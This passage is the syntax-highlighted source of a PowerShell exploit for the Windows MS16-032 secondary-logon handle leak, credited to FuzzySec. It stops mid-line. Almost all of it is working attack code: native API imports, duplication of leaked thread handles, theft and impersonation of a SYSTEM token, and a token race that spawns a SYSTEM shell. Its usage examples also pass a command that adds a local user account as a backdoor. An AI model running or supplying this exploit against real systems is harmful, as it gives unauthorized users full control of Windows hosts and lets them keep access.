class="line"><span class="comment">      but not spawn a shell. Not sure what the issue is but just re-run and profit!</span></span><br><span class="line"><span class="comment">    * Want to know more about MS16-032 ==&gt;</span></span><br><span class="line"><span class="comment">      https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">    Author: Ruben Boonen (@FuzzySec)</span></span><br><span class="line"><span class="comment">    Blog: http://www.fuzzysecurity.com/</span></span><br><span class="line"><span class="comment">    License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">    Required Dependencies: PowerShell v2+</span></span><br><span class="line"><span class="comment">    Optional Dependencies: None</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Application</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Specifies an Application to run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Commandline</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Specifies Commandline, such as net user xxx xxx /add</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">    C:\PS&gt; Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe</span></span><br><span class="line"><span class="comment">    C:\PS&gt; Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe -Commandline &quot;/c net user 1 1 /add&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">  <span class="function">[<span class="type">CmdletBinding</span>()]</span></span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span> = <span class="variable">$False</span>, <span class="type">ParameterSetName</span> = <span class="string">&#x27;C:\Windows\System32\cmd.exe&#x27;</span> )]</span><br><span class="line">        [<span class="built_in">string</span>]</span><br><span class="line">        <span class="variable">$Application</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span> = <span class="variable">$False</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]</span><br><span class="line">        <span class="variable">$Commandline</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="string">@&quot;</span></span><br><span class="line"><span class="string">    using System;</span></span><br><span class="line"><span class="string">    using System.Diagnostics;</span></span><br><span class="line"><span class="string">    using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">    using System.Security.Principal;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">    public struct PROCESS_INFORMATION</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        public IntPtr hProcess;</span></span><br><span class="line"><span class="string">        public IntPtr hThread;</span></span><br><span class="line"><span class="string">        public int dwProcessId;</span></span><br><span class="line"><span class="string">        public int dwThreadId;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]</span></span><br><span class="line"><span class="string">    public struct STARTUPINFO</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        public Int32 cb;</span></span><br><span class="line"><span class="string">        public string lpReserved;</span></span><br><span class="line"><span class="string">        public string lpDesktop;</span></span><br><span class="line"><span class="string">        public string lpTitle;</span></span><br><span class="line"><span class="string">        public Int32 dwX;</span></span><br><span class="line"><span class="string">        public Int32 dwY;</span></span><br><span class="line"><span class="string">        public Int32 dwXSize;</span></span><br><span class="line"><span class="string">        public Int32 dwYSize;</span></span><br><span class="line"><span class="string">        public Int32 dwXCountChars;</span></span><br><span class="line"><span class="string">        public Int32 dwYCountChars;</span></span><br><span class="line"><span class="string">        public Int32 dwFillAttribute;</span></span><br><span class="line"><span class="string">        public Int32 dwFlags;</span></span><br><span class="line"><span class="string">        public Int16 wShowWindow;</span></span><br><span class="line"><span class="string">        public Int16 cbReserved2;</span></span><br><span class="line"><span class="string">        public IntPtr lpReserved2;</span></span><br><span class="line"><span class="string">        public IntPtr hStdInput;</span></span><br><span class="line"><span class="string">        public IntPtr hStdOutput;</span></span><br><span class="line"><span class="string">        public IntPtr hStdError;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">    public struct SQOS</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        public int Length;</span></span><br><span class="line"><span class="string">        public int ImpersonationLevel;</span></span><br><span class="line"><span class="string">        public int ContextTrackingMode;</span></span><br><span class="line"><span class="string">        public bool EffectiveOnly;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public static class Advapi32</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true, CharSet=CharSet.Unicode)]</span></span><br><span class="line"><span class="string">        public static extern bool CreateProcessWithLogonW(</span></span><br><span class="line"><span class="string">            String userName,</span></span><br><span class="line"><span class="string">            String domain,</span></span><br><span class="line"><span class="string">            String password,</span></span><br><span class="line"><span class="string">            int logonFlags,</span></span><br><span class="line"><span class="string">            String applicationName,</span></span><br><span class="line"><span class="string">            String commandLine,</span></span><br><span class="line"><span class="string">            int creationFlags,</span></span><br><span class="line"><span class="string">            int environment,</span></span><br><span class="line"><span class="string">            String currentDirectory,</span></span><br><span class="line"><span class="string">            ref  STARTUPINFO startupInfo,</span></span><br><span class="line"><span class="string">            out PROCESS_INFORMATION processInformation);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool SetThreadToken(</span></span><br><span class="line"><span class="string">            ref IntPtr Thread,</span></span><br><span class="line"><span class="string">            IntPtr Token);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool OpenThreadToken(</span></span><br><span class="line"><span class="string">            IntPtr ThreadHandle,</span></span><br><span class="line"><span class="string">            int DesiredAccess,</span></span><br><span class="line"><span class="string">            bool OpenAsSelf,</span></span><br><span class="line"><span class="string">            out IntPtr TokenHandle);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool OpenProcessToken(</span></span><br><span class="line"><span class="string">            IntPtr ProcessHandle, </span></span><br><span class="line"><span class="string">            int DesiredAccess,</span></span><br><span class="line"><span class="string">            ref IntPtr TokenHandle);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public extern static bool DuplicateToken(</span></span><br><span class="line"><span class="string">            IntPtr ExistingTokenHandle,</span></span><br><span class="line"><span class="string">            int SECURITY_IMPERSONATION_LEVEL,</span></span><br><span class="line"><span class="string">            ref IntPtr DuplicateTokenHandle);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public static class Kernel32</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;)]</span></span><br><span class="line"><span class="string">        public static extern uint GetLastError();</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern IntPtr GetCurrentProcess();</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern IntPtr GetCurrentThread();</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern int GetThreadId(IntPtr hThread);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span></span><br><span class="line"><span class="string">        public static extern int GetProcessIdOfThread(IntPtr handle);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;,SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern int SuspendThread(IntPtr hThread);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;,SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern int ResumeThread(IntPtr hThread);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool TerminateProcess(</span></span><br><span class="line"><span class="string">            IntPtr hProcess,</span></span><br><span class="line"><span class="string">            uint uExitCode);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool CloseHandle(IntPtr hObject);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool DuplicateHandle(</span></span><br><span class="line"><span class="string">            IntPtr hSourceProcessHandle,</span></span><br><span class="line"><span class="string">            IntPtr hSourceHandle,</span></span><br><span class="line"><span class="string">            IntPtr hTargetProcessHandle,</span></span><br><span class="line"><span class="string">            ref IntPtr lpTargetHandle,</span></span><br><span class="line"><span class="string">            int dwDesiredAccess,</span></span><br><span class="line"><span class="string">            bool bInheritHandle,</span></span><br><span class="line"><span class="string">            int dwOptions);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public static class Ntdll</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        [DllImport(&quot;ntdll.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern int NtImpersonateThread(</span></span><br><span class="line"><span class="string">            IntPtr ThreadHandle,</span></span><br><span class="line"><span class="string">            IntPtr ThreadToImpersonate,</span></span><br><span class="line"><span class="string">            ref SQOS SecurityQualityOfService);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-ThreadHandle</span></span> &#123;</span><br><span class="line">        <span class="comment"># StartupInfo Struct</span></span><br><span class="line">        <span class="variable">$StartupInfo</span> = <span class="built_in">New-Object</span> STARTUPINFO</span><br><span class="line">        <span class="variable">$StartupInfo</span>.dwFlags = <span class="number">0</span>x00000101 <span class="comment"># STARTF_USESTDHANDLES</span></span><br><span class="line">            <span class="variable">$StartupInfo</span>.wShowWindow = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$StartupInfo</span>.hStdInput = [<span class="type">Kernel32</span>]::GetCurrentThread()</span><br><span class="line">        <span class="variable">$StartupInfo</span>.hStdOutput = [<span class="type">Kernel32</span>]::GetCurrentThread()</span><br><span class="line">        <span class="variable">$StartupInfo</span>.hStdError = [<span class="type">Kernel32</span>]::GetCurrentThread()</span><br><span class="line">        <span class="variable">$StartupInfo</span>.cb = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$StartupInfo</span>) <span class="comment"># Struct Size</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ProcessInfo Struct</span></span><br><span class="line">        <span class="variable">$ProcessInfo</span> = <span class="built_in">New-Object</span> PROCESS_INFORMATION</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># CreateProcessWithLogonW --&gt; lpCurrentDirectory</span></span><br><span class="line">        <span class="variable">$GetCurrentPath</span> = (<span class="built_in">Get-Item</span> <span class="literal">-Path</span> <span class="string">&quot;.\&quot;</span> <span class="literal">-Verbose</span>).FullName</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::CreateProcessWithLogonW(</span><br><span class="line">            <span class="string">&quot;user&quot;</span>, <span class="string">&quot;domain&quot;</span>, <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">            <span class="number">0</span>x00000002, <span class="string">&quot;C:\Windows\System32\notepad.exe&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="number">0</span>x00000004, <span class="variable">$null</span>, <span class="variable">$GetCurrentPath</span>,</span><br><span class="line">            [<span class="type">ref</span>]<span class="variable">$StartupInfo</span>, [<span class="type">ref</span>]<span class="variable">$ProcessInfo</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Duplicate handle into current process -&gt; DUPLICATE_SAME_ACCESS</span></span><br><span class="line">        <span class="variable">$lpTargetHandle</span> = [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::DuplicateHandle(</span><br><span class="line">            <span class="variable">$ProcessInfo</span>.hProcess, <span class="number">0</span>x4,</span><br><span class="line">            [<span class="type">Kernel32</span>]::GetCurrentProcess(),</span><br><span class="line">            [<span class="type">ref</span>]<span class="variable">$lpTargetHandle</span>, <span class="number">0</span>, <span class="variable">$false</span>,</span><br><span class="line">            <span class="number">0</span>x00000002)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Clean up suspended process</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::TerminateProcess(<span class="variable">$ProcessInfo</span>.hProcess, <span class="number">1</span>)</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::CloseHandle(<span class="variable">$ProcessInfo</span>.hProcess)</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::CloseHandle(<span class="variable">$ProcessInfo</span>.hThread)</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$lpTargetHandle</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-SystemToken</span></span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;`n[?] Trying thread handle: <span class="variable">$Thread</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[?] Thread belongs to: <span class="variable">$</span>(<span class="variable">$</span>(Get-Process -PID <span class="variable">$</span>([Kernel32]::GetProcessIdOfThread(<span class="variable">$Thread</span>))).ProcessName)&quot;</span></span><br><span class="line">    </span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::SuspendThread(<span class="variable">$Thread</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$CallResult</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] <span class="variable">$Thread</span> is a bad thread, moving on..&quot;</span></span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125; <span class="built_in">echo</span> <span class="string">&quot;[+] Thread suspended&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Wiping current impersonation token&quot;</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::SetThreadToken([<span class="type">ref</span>]<span class="variable">$Thread</span>, [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$CallResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] SetThreadToken failed, moving on..&quot;</span></span><br><span class="line">            <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::ResumeThread(<span class="variable">$Thread</span>)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[+] Thread resumed!&quot;</span></span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Building SYSTEM impersonation token&quot;</span></span><br><span class="line">        <span class="comment"># SecurityQualityOfService struct</span></span><br><span class="line">        <span class="variable">$SQOS</span> = <span class="built_in">New-Object</span> SQOS</span><br><span class="line">        <span class="variable">$SQOS</span>.ImpersonationLevel = <span class="number">2</span> <span class="comment">#SecurityImpersonation</span></span><br><span class="line">        <span class="variable">$SQOS</span>.Length = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$SQOS</span>)</span><br><span class="line">        <span class="comment"># Undocumented API&#x27;s, I like your style Microsoft ;)</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Ntdll</span>]::NtImpersonateThread(<span class="variable">$Thread</span>, <span class="variable">$Thread</span>, [<span class="type">ref</span>]<span class="variable">$sqos</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$CallResult</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] NtImpersonateThread failed, moving on..&quot;</span></span><br><span class="line">            <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::ResumeThread(<span class="variable">$Thread</span>)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[+] Thread resumed!&quot;</span></span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$script:SysTokenHandle</span> = [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero</span><br><span class="line">        <span class="comment"># 0x0006 --&gt; TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::OpenThreadToken(<span class="variable">$Thread</span>, <span class="number">0</span>x0006, <span class="variable">$false</span>, [<span class="type">ref</span>]<span class="variable">$SysTokenHandle</span>)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$CallResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] OpenThreadToken failed, moving on..&quot;</span></span><br><span class="line">            <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::ResumeThread(<span class="variable">$Thread</span>)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[+] Thread resumed!&quot;</span></span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[?] Success, open SYSTEM token handle: <span class="variable">$SysTokenHandle</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[+] Resuming thread..&quot;</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::ResumeThread(<span class="variable">$Thread</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># main() &lt;--- ;)</span></span><br><span class="line">    <span class="variable">$ms16032</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">     __ __ ___ ___   ___     ___ ___ ___ </span></span><br><span class="line"><span class="string">    |  V  |  _|_  | |  _|___|   |_  |_  |</span></span><br><span class="line"><span class="string">    |     |_  |_| |_| . |___| | |_  |  _|</span></span><br><span class="line"><span class="string">    |_|_|_|___|_____|___|   |___|___|___|</span></span><br><span class="line"><span class="string">                                        </span></span><br><span class="line"><span class="string">                   [by b33f -&gt; @FuzzySec]</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ms16032</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Check logical processor count, race condition requires 2+</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;`n[?] Operating system core count: <span class="variable">$</span>([System.Environment]::ProcessorCount)&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$</span>([<span class="type">System.Environment</span>]::ProcessorCount) <span class="operator">-lt</span> <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[!] This is a VM isn&#x27;t it, race condition requires at least 2 CPU cores, exiting!`n&quot;</span></span><br><span class="line">        <span class="keyword">Return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Create array for Threads &amp; TID&#x27;s</span></span><br><span class="line">    <span class="variable">$ThreadArray</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    <span class="variable">$TidArray</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Duplicating CreateProcessWithLogonW handles..&quot;</span></span><br><span class="line">    <span class="comment"># Loop Get-ThreadHandle and collect thread handles with a valid TID</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">500</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$hThread</span> = <span class="built_in">Get-ThreadHandle</span></span><br><span class="line">        <span class="variable">$hThreadID</span> = [<span class="type">Kernel32</span>]::GetThreadId(<span class="variable">$hThread</span>)</span><br><span class="line">        <span class="comment"># Bit hacky/lazy, filters on uniq/valid TID&#x27;s to create $ThreadArray</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$TidArray</span> <span class="operator">-notcontains</span> <span class="variable">$hThreadID</span>) &#123;</span><br><span class="line">            <span class="variable">$TidArray</span> += <span class="variable">$hThreadID</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$hThread</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable">$ThreadArray</span> += <span class="variable">$hThread</span> <span class="comment"># This is what we need!</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$</span>(<span class="variable">$ThreadArray</span>.length) <span class="operator">-eq</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[!] No valid thread handles were captured, exiting!&quot;</span></span><br><span class="line">        <span class="keyword">Return</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[?] Done, got <span class="variable">$</span>(<span class="variable">$ThreadArray</span>.length) thread handle(s)!&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;`n[?] Thread handle list:&quot;</span></span><br><span class="line">        <span class="variable">$ThreadArray</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;`n[*] Sniffing out privileged impersonation token..&quot;</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$Thread</span> <span class="keyword">in</span> <span class="variable">$ThreadArray</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># Get handle to SYSTEM access token</span></span><br><span class="line">        <span class="built_in">Get-SystemToken</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;`n[*] Sniffing out SYSTEM shell..&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;`n[&gt;] Duplicating SYSTEM token&quot;</span></span><br><span class="line">        <span class="variable">$hDuplicateTokenHandle</span> = [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::DuplicateToken(<span class="variable">$SysTokenHandle</span>, <span class="number">2</span>, [<span class="type">ref</span>]<span class="variable">$hDuplicateTokenHandle</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Simple PS runspace definition</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Starting token race&quot;</span></span><br><span class="line">        <span class="variable">$Runspace</span> = [<span class="type">runspacefactory</span>]::CreateRunspace()</span><br><span class="line">        <span class="variable">$StartTokenRace</span> = [<span class="type">powershell</span>]::Create()</span><br><span class="line">        <span class="variable">$StartTokenRace</span>.runspace = <span class="variable">$Runspace</span></span><br><span class="line">        <span class="variable">$Runspace</span>.Open()</span><br><span class="line">        [<span class="built_in">void</span>]<span class="variable">$StartTokenRace</span>.AddScript(&#123;</span><br><span class="line">            <span class="keyword">Param</span> (<span class="variable">$Thread</span>, <span class="variable">$hDuplicateTokenHandle</span>)</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$true</span>) &#123;</span><br><span class="line">                <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::SetThreadToken([<span class="type">ref</span>]<span class="variable">$Thread</span>, <span class="variable">$hDuplicateTokenHandle</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).AddArgument(<span class="variable">$Thread</span>).AddArgument(<span class="variable">$hDuplicateTokenHandle</span>)</span><br><span class="line">        <span class="variable">$AscObj</span> = <span class="variable">$StartTokenRace</span>.BeginInvoke()</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Starting process race&quot;</span></span><br><span class="line">        <span class="comment"># Adding a timeout (10 seconds) here to safeguard from edge-cases</span></span><br><span class="line">        <span class="variable">$SafeGuard</span> = [<span class="type">diagnostics.stopwatch</span>]::StartNew()</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$SafeGuard</span>.ElapsedMilliseconds <span class="operator">-lt</span> <span class="number">10000</span>) &#123;</span><br><span class="line">        <span class="comment"># StartupInfo Struct</span></span><br><span class="line">        <span class="variable">$StartupInfo</span> = <span class="built_in">New-Object</span> STARTUPINFO</span><br><span class="line">        <span class="variable">$StartupInfo</span>.cb = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$StartupInfo</span>) <span class="comment"># Struct Size</span></span><br><span class="line">        <span class="variable">$StartupInfo</span>.dwFlags = <span class="number">0</span>x00000101 <span class="comment"># STARTF_USESTDHANDLES</span></span><br><span class="line">            <span class="variable">$StartupInfo</span>.wShowWindow = <span class="number">0</span>;</span><br><span class="line">        <span class="comment"># ProcessInfo Struct</span></span><br><span class="line">        <span class="variable">$ProcessInfo</span> = <span class="built_in">New-Object</span> PROCESS_INFORMATION</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># CreateProcessWithLogonW --&gt; lpCurrentDirectory</span></span><br><span class="line">        <span class="variable">$GetCurrentPath</span> = (<span class="built_in">Get-Item</span> <span class="literal">-Path</span> <span class="string">&quot;.\&quot;</span> <span class="literal">-Verbose</span>).FullName</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::CreateProcessWithLogonW(</span><br><span class="line">            <span class="string">&quot;user&quot;</span>, <span class="string">&quot;domain&quot;</span>, <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">            <span class="number">0</span>x00000002, <span class="variable">$Application</span>,<span class="variable">$Commandline</span>,</span><br><span class="line">            <span class="number">0</span>x00000004, <span class="variable">$null</span>, <span class="variable">$GetCurrentPath</span>,</span><br><span class="line">            [<span class="type">ref</span>]<span class="variable">$StartupInfo</span>, [<span class="type">ref</span>]<span class="variable">$ProcessInfo</span>)</span><br><span class="line">        <span class="comment">#---</span></span><br><span class="line">        <span class="comment"># Make sure CreateProcessWithLogonW ran successfully! If not, skip loop.</span></span><br><span class="line">        <span class="comment">#---</span></span><br><span class="line">        <span class="comment"># Missing this check used to cause the exploit to fail sometimes.</span></span><br><span class="line">        <span class="comment"># If CreateProcessWithLogon fails OpenProcessToken won&#x27;t succeed</span></span><br><span class="line">        <span class="comment"># but we obviously don&#x27;t have a SYSTEM shell :&#x27;( . Should be 100%</span></span><br><span class="line">        <span class="comment"># reliable now!</span></span><br><span class="line">        <span class="comment">#---</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$CallResult</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;            </span><br><span class="line">        <span class="variable">$hTokenHandle</span> = [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::OpenProcessToken(<span class="variable">$ProcessInfo</span>.hProcess, <span class="number">0</span>x28, [<span class="type">ref</span>]<span class="variable">$hTokenHandle</span>)</span><br><span class="line">        <span class="comment"># If we can&#x27;t open the process token it&#x27;s a SYSTEM shell!</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$CallResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] Holy handle leak Batman, we have a SYSTEM shell!!`n&quot;</span></span><br><span class="line">            <span class="variable">$CallResult</span> = [<span 